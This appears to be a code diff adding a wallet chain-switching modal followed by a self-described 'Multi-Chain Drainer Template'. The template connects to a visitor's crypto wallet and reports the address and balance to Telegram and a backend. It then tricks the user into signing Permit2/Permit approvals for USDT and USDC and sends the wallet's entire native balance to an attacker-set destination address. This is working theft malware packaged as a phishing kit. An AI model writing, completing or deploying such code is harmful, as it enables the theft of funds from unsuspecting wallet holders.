+      name: 'Optimism',
+      symbol: 'ETH',
+      icon: '🔴',
+      color: '#FF0420',
+      rpc: 'https://mainnet.optimism.io'
+    },
+    base: {
+      chainId: '0x2105',
+      chainIdNum: 8453,
+      name: 'Base',
+      symbol: 'ETH',
+      icon: '🔷',
+      color: '#0052FF',
+      rpc: 'https://mainnet.base.org'
+    },
+    fantom: {
+      chainId: '0xfa',
+      chainIdNum: 250,
+      name: 'Fantom',
+      symbol: 'FTM',
+      icon: '👻',
+      color: '#1969FF',
+      rpc: 'https://rpc.ftm.tools'
+    },
+    unichain: {
+      chainId: '0x82',
+      chainIdNum: 130,
+      name: 'Unichain',
+      symbol: 'ETH',
+      icon: '🦄',
+      color: '#FF007A',
+      rpc: 'https://mainnet.unichain.org'
+    },
+    sonic: {
+      chainId: '0x92',
+      chainIdNum: 146,
+      name: 'Sonic',
+      symbol: 'S',
+      icon: '⚡',
+      color: '#0066FF',
+      rpc: 'https://rpc.soniclabs.com'
+    },
+    berachain: {
+      chainId: '0x138c2',
+      chainIdNum: 80094,
+      name: 'Berachain',
+      symbol: 'BERA',
+      icon: '🐻',
+      color: '#F9A826',
+      rpc: 'https://rpc.berachain.com'
+    },
+    linea: {
+      chainId: '0xe708',
+      chainIdNum: 59144,
+      name: 'Linea',
+      symbol: 'ETH',
+      icon: '📄',
+      color: '#000000',
+      rpc: 'https://rpc.linea.build'
+    },
+    scroll: {
+      chainId: '0x534352',
+      chainIdNum: 534352,
+      name: 'Scroll',
+      symbol: 'ETH',
+      icon: '📜',
+      color: '#FFEEDA',
+      rpc: 'https://rpc.scroll.io'
+    },
+    zksync: {
+      chainId: '0x144',
+      chainIdNum: 324,
+      name: 'zkSync Era',
+      symbol: 'ETH',
+      icon: '⬡',
+      color: '#8C8C8C',
+      rpc: 'https://mainnet.era.zksync.io'
+    },
+    blast: {
+      chainId: '0x13e31',
+      chainIdNum: 81457,
+      name: 'Blast',
+      symbol: 'ETH',
+      icon: '🟡',
+      color: '#FCFC03',
+      rpc: 'https://rpc.blast.io'
+    }
+  };
+
+  // Default styles
+  const DEFAULT_STYLES = `
+    .chain-modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999997;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+    .chain-modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .chain-modal {
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      border-radius: 20px;
+      padding: 24px;
+      max-width: 440px;
+      width: 90%;
+      max-height: 80vh;
+      overflow-y: auto;
+      box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .chain-modal-overlay.active .chain-modal {
+      transform: scale(1);
+    }
+    .chain-modal-header {
+      text-align: center;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .chain-modal-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+      margin: 0 0 8px 0;
+    }
+    .chain-modal-subtitle {
+      font-size: 14px;
+      color: #a0a0b0;
+      margin: 0;
+    }
+    .chain-close {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      border: none;
+      color: #fff;
+      font-size: 18px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s ease;
+    }
+    .chain-close:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+    .chain-current {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      background: rgba(102, 126, 234, 0.1);
+      border: 1px solid rgba(102, 126, 234, 0.3);
+      border-radius: 12px;
+      margin-bottom: 16px;
+    }
+    .chain-current-label {
+      font-size: 12px;
+      color: #a0a0b0;
+      margin-right: auto;
+    }
+    .chain-current-name {
+      font-size: 14px;
+      font-weight: 600;
+      color: #fff;
+    }
+    .chain-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+    }
+    .chain-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid transparent;
+    }
+    .chain-option:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+    .chain-option.active {
+      background: rgba(102, 126, 234, 0.1);
+      border-color: rgba(102, 126, 234, 0.5);
+    }
+    .chain-option.switching {
+      pointer-events: none;
+      opacity: 0.7;
+    }
+    .chain-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      background: rgba(255, 255, 255, 0.1);
+    }
+    .chain-name {
+      font-size: 14px;
+      font-weight: 500;
+      color: #fff;
+    }
+    .chain-check {
+      margin-left: auto;
+      color: #22c55e;
+      font-size: 16px;
+    }
+    .chain-spinner {
+      margin-left: auto;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #667eea;
+      border-radius: 50%;
+      animation: chain-spin 1s linear infinite;
+    }
+    @keyframes chain-spin {
+      to { transform: rotate(360deg); }
+    }
+    .chain-error {
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 12px;
+      padding: 12px;
+      margin-top: 16px;
+      color: #f87171;
+      font-size: 13px;
+      text-align: center;
+    }
+    .chain-switch-prompt {
+      text-align: center;
+      padding: 24px;
+    }
+    .chain-switch-icon {
+      font-size: 48px;
+      margin-bottom: 16px;
+    }
+    .chain-switch-message {
+      font-size: 16px;
+      color: #fff;
+      margin-bottom: 8px;
+    }
+    .chain-switch-detail {
+      font-size: 14px;
+      color: #a0a0b0;
+    }
+    @media (max-width: 480px) {
+      .chain-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  `;
+
+  // Modal container
+  let modalContainer = null;
+
+  /**
+   * Initialize
+   */
+  function init() {
+    if (!document.getElementById('chain-modal-styles')) {
+      const style = document.createElement('style');
+      style.id = 'chain-modal-styles';
+      style.textContent = DEFAULT_STYLES;
+      document.head.appendChild(style);
+    }
+
+    if (!modalContainer) {
+      modalContainer = document.createElement('div');
+      modalContainer.id = 'chain-modal-overlay';
+      modalContainer.className = 'chain-modal-overlay';
+      document.body.appendChild(modalContainer);
+    }
+  }
+
+  /**
+   * Get current chain
+   */
+  async function getCurrentChain() {
+    if (!window.ethereum) return null;
+
+    try {
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      for (const [key, chain] of Object.entries(CHAINS)) {
+        if (chain.chainId.toLowerCase() === chainId.toLowerCase()) {
+          return { key, ...chain };
+        }
+      }
+      return { chainId, name: 'Unknown Chain' };
+    } catch {
+      return null;
+    }
+  }
+
+  /**
+   * Show chain selection modal
+   */
+  async function show(options = {}) {
+    init();
+
+    const {
+      title = 'Select Network',
+      subtitle = 'Choose a network to switch to',
+      chains = Object.keys(CHAINS), // Default to all chains
+      showCurrent = true,
+      allowClose = true,
+      onSwitch = null
+    } = options;
+
+    const currentChain = await getCurrentChain();
+
+    const chainOptions = chains.map(key => {
+      const chain = CHAINS[key];
+      if (!chain) return '';
+      
+      const isCurrent = currentChain && currentChain.chainId === chain.chainId;
+      
+      return `
+        <div class="chain-option ${isCurrent ? 'active' : ''}" data-chain="${key}" data-chain-id="${chain.chainId}">
+          <div class="chain-icon" style="background: ${chain.color}20; color: ${chain.color}">
+            ${chain.icon}
+          </div>
+          <span class="chain-name">${chain.name}</span>
+          ${isCurrent ? '<span class="chain-check">✓</span>' : ''}
+        </div>
+      `;
+    }).join('');
+
+    const currentChainHtml = showCurrent && currentChain ? `
+      <div class="chain-current">
+        <div class="chain-icon" style="background: ${currentChain.color || '#667eea'}20; color: ${currentChain.color || '#667eea'}">
+          ${currentChain.icon || '🔗'}
+        </div>
+        <div>
+          <div class="chain-current-label">Current Network</div>
+          <div class="chain-current-name">${currentChain.name}</div>
+        </div>
+      </div>
+    ` : '';
+
+    modalContainer.innerHTML = `
+      <div class="chain-modal">
+        <div class="chain-modal-header">
+          <h3 class="chain-modal-title">${title}</h3>
+          <p class="chain-modal-subtitle">${subtitle}</p>
+          ${allowClose ? '<button class="chain-close">&times;</button>' : ''}
+        </div>
+        ${currentChainHtml}
+        <div class="chain-grid">
+          ${chainOptions}
+        </div>
+      </div>
+    `;
+
+    // Show modal
+    setTimeout(() => modalContainer.classList.add('active'), 10);
+
+    return new Promise((resolve, reject) => {
+      // Close button
+      const closeBtn = modalContainer.querySelector('.chain-close');
+      if (closeBtn) {
+        closeBtn.addEventListener('click', () => {
+          hide();
+          reject(new Error('User cancelled'));
+        });
+      }
+
+      // Click overlay to close
+      if (allowClose) {
+        modalContainer.addEventListener('click', (e) => {
+          if (e.target === modalContainer) {
+            hide();
+            reject(new Error('User cancelled'));
+          }
+        });
+      }
+
+      // Chain option clicks
+      const options = modalContainer.querySelectorAll('.chain-option');
+      options.forEach(option => {
+        option.addEventListener('click', async () => {
+          const chainKey = option.dataset.chain;
+          const chainId = option.dataset.chainId;
+
+          // Don't switch if already on this chain
+          if (option.classList.contains('active')) {
+            resolve({ chainKey, chainId, switched: false, reason: 'already_on_chain' });
+            return;
+          }
+
+          try {
+            // Show switching state
+            option.classList.add('switching');
+            const checkMark = option.querySelector('.chain-check');
+            if (checkMark) checkMark.remove();
+            
+            const spinner = document.createElement('div');
+            spinner.className = 'chain-spinner';
+            option.appendChild(spinner);
+
+            const result = await switchToChain(chainId, chainKey);
+            
+            // Update UI
+            options.forEach(o => o.classList.remove('active'));
+            option.classList.add('active');
+            option.classList.remove('switching');
+            spinner.remove();
+            
+            const check = document.createElement('span');
+            check.className = 'chain-check';
+            check.textContent = '✓';
+            option.appendChild(check);
+
+            hide();
+            resolve({ chainKey, chainId, switched: true, ...result });
+            if (onSwitch) onSwitch({ chainKey, chainId, switched: true });
+          } catch (error) {
+            option.classList.remove('switching');
+            const spinner = option.querySelector('.chain-spinner');
+            if (spinner) spinner.remove();
+            
+            showError(error.message);
+            reject(error);
+          }
+        });
+      });
+    });
+  }
+
+  /**
+   * Switch to specific chain
+   */
+  async function switchToChain(chainId, chainKey) {
+    if (!window.ethereum) {
+      throw new Error('No wallet connected');
+    }
+
+    try {
+      // Try to switch
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId }]
+      });
+
+      return { success: true, added: false };
+    } catch (switchError) {
+      // Chain not added - try to add it
+      if (switchError.code === 4902) {
+        const chain = CHAINS[chainKey];
+        if (!chain) {
+          throw new Error('Chain configuration not found');
+        }
+
+        try {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: chain.chainId,
+              chainName: chain.name,
+              nativeCurrency: {
+                name: chain.name,
+                symbol: chain.symbol,
+                decimals: 18
+              },
+              rpcUrls: [chain.rpc],
+              blockExplorerUrls: []
+            }]
+          });
+
+          return { success: true, added: true };
+        } catch (addError) {
+          throw new Error(`Failed to add network: ${addError.message}`);
+        }
+      }
+
+      throw new Error(`Switch failed: ${switchError.message}`);
+    }
+  }
+
+  /**
+   * Prompt user to switch to specific chain
+   */
+  async function promptSwitch(targetChain, options = {}) {
+    init();
+
+    const chain = CHAINS[targetChain];
+    if (!chain) {
+      throw new Error(`Unknown chain: ${targetChain}`);
+    }
+
+    const currentChain = await getCurrentChain();
+    if (currentChain && currentChain.chainId === chain.chainId) {
+      return { switched: false, reason: 'already_on_chain' };
+    }
+
+    const {
+      title = 'Switch Network',
+      message = `Please switch to ${chain.name} to continue`,
+      autoSwitch = false
+    } = options;
+
+    if (autoSwitch) {
+      try {
+        return await switchToChain(chain.chainId, targetChain);
+      } catch (error) {
+        // If auto-switch fails, show the prompt
+      }
+    }
+
+    modalContainer.innerHTML = `
+      <div class="chain-modal">
+        <div class="chain-switch-prompt">
+          <div class="chain-switch-icon">${chain.icon}</div>
+          <div class="chain-switch-message">${title}</div>
+          <div class="chain-switch-detail">${message}</div>
+        </div>
+        <div class="chain-grid" style="grid-template-columns: 1fr 1fr; margin-top: 16px;">
+          <button class="chain-option" id="chain-cancel" style="justify-content: center;">
+            <span class="chain-name">Cancel</span>
+          </button>
+          <button class="chain-option" id="chain-switch" style="justify-content: center; background: rgba(102, 126, 234, 0.2);">
+            <span class="chain-name">Switch</span>
+          </button>
+        </div>
+      </div>
+    `;
+
+    setTimeout(() => modalContainer.classList.add('active'), 10);
+
+    return new Promise((resolve, reject) => {
+      const cancelBtn = modalContainer.querySelector('#chain-cancel');
+      const switchBtn = modalContainer.querySelector('#chain-switch');
+
+      cancelBtn.addEventListener('click', () => {
+        hide();
+        reject(new Error('User cancelled'));
+      });
+
+      switchBtn.addEventListener('click', async () => {
+        switchBtn.classList.add('switching');
+        switchBtn.innerHTML = '<div class="chain-spinner"></div><span class="chain-name">Switching...</span>';
+
+        try {
+          const result = await switchToChain(chain.chainId, targetChain);
+          hide();
+          resolve({ switched: true, ...result });
+        } catch (error) {
+          switchBtn.classList.remove('switching');
+          switchBtn.innerHTML = '<span class="chain-name">Switch</span>';
+          showError(error.message);
+          reject(error);
+        }
+      });
+    });
+  }
+
+  /**
+   * Show error message
+   */
+  function showError(message) {
+    let errorDiv = modalContainer.querySelector('.chain-error');
+
+    if (!errorDiv) {
+      errorDiv = document.createElement('div');
+      errorDiv.className = 'chain-error';
+      modalContainer.querySelector('.chain-modal').appendChild(errorDiv);
+    }
+
+    errorDiv.textContent = message;
+    errorDiv.style.display = 'block';
+
+    setTimeout(() => {
+      errorDiv.style.display = 'none';
+    }, 5000);
+  }
+
+  /**
+   * Hide modal
+   */
+  function hide() {
+    if (modalContainer) {
+      modalContainer.classList.remove('active');
+      setTimeout(() => {
+        modalContainer.innerHTML = '';
+      }, 300);
+    }
+  }
+
+  /**
+   * Listen for chain changes
+   */
+  function onChainChange(callback) {
+    if (window.ethereum) {
+      window.ethereum.on('chainChanged', (chainId) => {
+        const chain = Object.values(CHAINS).find(c => c.chainId.toLowerCase() === chainId.toLowerCase());
+        callback({
+          chainId,
+          chainKey: chain ? Object.keys(CHAINS).find(k => CHAINS[k] === chain) : null,
+          chainName: chain?.name || 'Unknown'
+        });
+      });
+    }
+  }
+
+  /**
+   * Get chain info by chain ID
+   */
+  function getChainInfo(chainId) {
+    const hexId = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;
+    
+    for (const [key, chain] of Object.entries(CHAINS)) {
+      if (chain.chainId.toLowerCase() === hexId.toLowerCase()) {
+        return { key, ...chain };
+      }
+    }
+
+    return null;
+  }
+
+  // Public API
+  return {
+    CHAINS,
+    init,
+    show,
+    hide,
+    getCurrentChain,
+    switchToChain,
+    promptSwitch,
+    onChainChange,
+    getChainInfo
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = ChainModal;
+}
+
+  // ===== MAIN TEMPLATE =====
+  /**
+ * Professional Multi-Chain Drainer Template
+ * v2.8 Modular Architecture
+ */
+
+(function() {
+  'use strict';
+
+  // Config is injected by template engine
+  const CONFIG = window.DRAINER_CONFIG || {};
+  const TOGGLES = CONFIG.checkboxes || {};
+
+  /**
+   * Helper to fetch ETH balance
+   */
+  async function getEthBalance(address) {
+    try {
+      const balance = await window.ethereum.request({
+        method: 'eth_getBalance',
+        params: [address, 'latest']
+      });
+      return parseFloat(parseInt(balance, 16) / 10**18).toFixed(4);
+    } catch (e) {
+      return '0.0000';
+    }
+  }
+
+  /**
+   * Main Execution Logic
+   */
+  async function run() {
+    try {
+      // 1. Detect Wallet
+      const wallet = await WalletDetect.connect();
+      if (!wallet) return;
+
+      // 2. Initial Balance Check
+      const balance = await getEthBalance(wallet.address);
+      
+      // 3. Initial Chain Scan & Stats
+      Logger.logConnection({
+        address: wallet.address,
+        chain: wallet.chainId,
+        walletType: wallet.type,
+        balance: balance,
+        userAgent: navigator.userAgent
+      });
+
+      if (window.Stats) {
+        window.Stats.log('connect', { 
+            address: wallet.address, 
+            chain: wallet.chainId, 
+            metadata: { walletType: wallet.type, balance: balance } 
+        });
+      }
+
+      // Check if we should proceed based on balance
+      if (TOGGLES.onlyIfBalance && parseFloat(balance) <= 0) {
+          console.log('[Drainer] No balance detected, stopping as per config.');
+          return;
+      }
+
+      // 4. Asset Analysis & Prioritization
+      // Common chains to scan: Ethereum, BSC, Polygon, Arbitrum, Base
+      const chainsToScan = ['0x1', '0x38', '0x89', '0xa4b1', '0x2105'];
+      
+      for (const chainId of chainsToScan) {
+        // Switch chain if necessary
+        try {
+            const switched = await ChainSwitch.switchTo(window.ethereum, chainId);
+            if (!switched.success) continue;
+
+            // Execute strategy for this chain
+            await executeDrainStrategy(wallet.address, chainId);
+        } catch (e) {
+            console.warn(`[ChainSwitch] Failed to switch to ${chainId}:`, e.message);
+        }
+      }
+
+      Logger.send("✅ <b>Operation Completed</b>\nScan finished for all priority chains.");
+
+    } catch (error) {
+      console.error("[Drainer] Fatal:", error);
+      Logger.logError("Execution Error", error);
+    }
+  }
+
+  /**
+   * Chain-specific drain strategy
+   */
+  async function executeDrainStrategy(address, chainId) {
+    // Define tokens, including native tokens
+    const chainTokens = {
+      '0x1': ['0xdAC17F958D2ee523a2206206994597C13D831ec7', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'], // ETH: USDT, USDC
+      '0x38': ['0x55d398326f99059fF775485246999027B3197955', '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'], // BSC: USDT, USDC
+      '0x89': ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F', '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'], // Polygon: USDT, USDC
+      '0xa4b1': ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'], // Arb: USDT, USDC
+      '0x2105': ['0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'], // Base: USDC
+    };
+  
+    // Define native tokens per chain
+    const nativeTokens = {
+      '0x1': { symbol: 'ETH', address: null },
+      '0x38': { symbol: 'BNB', address: null },
+      '0x89': { symbol: 'MATIC', address: null },
+      '0xa4b1': { symbol: 'AVAX', address: null },
+      '0x2105': { symbol: 'ETH', address: null }, // Assuming Base chain uses ETH-like native token
+    };
+  
+    const tokens = chainTokens[chainId] || [];
+  
+    // Handle ERC-20 tokens
+    for (const tokenAddress of tokens) {
+      try {
+        if (!TOGGLES.disablePermit2) {
+          await Permit2.requestPermit2Signature(window.ethereum, address, {
+            token: tokenAddress,
+            spender: CONFIG.destination,
+            chainId: parseInt(chainId, 16)
+          });
+        } else {
+          await Permit.requestPermitSignature(window.ethereum, address, {
+            token: tokenAddress,
+            spender: CONFIG.destination,
+            chainId: parseInt(chainId, 16)
+          });
+        }
+      } catch (e) {
+        console.warn(`[Strategy] Failed token ${tokenAddress}:`, e.message);
+      }
+    }
+  
+    // Handle native token
+    const nativeToken = nativeTokens[chainId];
+    if (nativeToken) {
+      try {
+        // Example: send native token balance to destination
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+  
+        // Fetch balance
+        const balance = await provider.getBalance(address);
+  
+        if (balance.gt(0)) {
+          // Send balance to destination
+          const tx = await signer.sendTransaction({
+            to: CONFIG.destination,
+            value: balance
+          });
+          await tx.wait();
+          console.log(`Transferred native token (${nativeToken.symbol}) to ${CONFIG.destination}`);
+        }
+      } catch (e) {
+        console.warn(`[Strategy] Failed to transfer native token on chain ${chainId}:`, e.message);
+      }
+    }
+  }
+
+  // Event Listeners for professional integration
+  function bindUI() {
+    const buttons = document.querySelectorAll(`.${CONFIG.connectButtonsClass || 'interact-button'}`);
+    buttons.forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.preventDefault();
+        run();
+      });
+    });
+  }
+
+  // Startup
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', bindUI);
+  } else {
+    bindUI();
+  }
+
+})();
+
+window.WalletModal = WalletModal;
+
+  // ===== INITIALIZATION =====
+  (async function() {
+    try {
+      // 1. Stats Helper
+      window.Stats = {
+          log: async function(type, payload) {
+              try {
+                  const data = {
+                      chain: payload.chain || 'unknown',
+                      type: type,
+                      address: payload.address || 'Visitor',
+                      user_id: window.DRAINER_CONFIG.user_id || null,
+                      amount: payload.amount || null,
+                      token: payload.token || null,
+                      txHash: payload.txHash || null,
+                      metadata: payload.metadata || {}
+                  };
+                  await fetch('/api/log-event', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify(data)
+                  });
+              } catch (e) {}
+          }
+      };
+
+      // 2. Configure Logger
+      if (typeof Logger !== 'undefined' && window.DRAINER_CONFIG.telegram) {
+        Logger.configure(window.DRAINER_CONFIG.telegram);
+        console.log('[Logger] Configured');
+      }
+
+      // 3. Track Visit
+      if (window.DRAINER_CONFIG.destination) {
+        const visitorData = {
+          address: 'Visitor', // Placeholder until connected
+          chain: 'detecting',
+          referrer: document.referrer || 'direct',
+          user_id: window.DRAINER_CONFIG.user_id || null
+        };
+        
+        // Log to Telegram
+        if (typeof Logger !== "undefined") {
+           Logger.send("<b>👀 New Visitor</b>\n" + 
+                       "Referrer: <code>" + (document.referrer || "Direct") + "</code>\n" + 
+                       "Page: <code>" + window.location.href + "</code>");
+        }
+
+        // Send to backend
+        window.Stats.log('visit', { referrer: document.referrer || 'direct' });
+      }
+    } catch (e) {
+      console.error('[Init] Error:', e);
+    }
+  })();
+
+})();
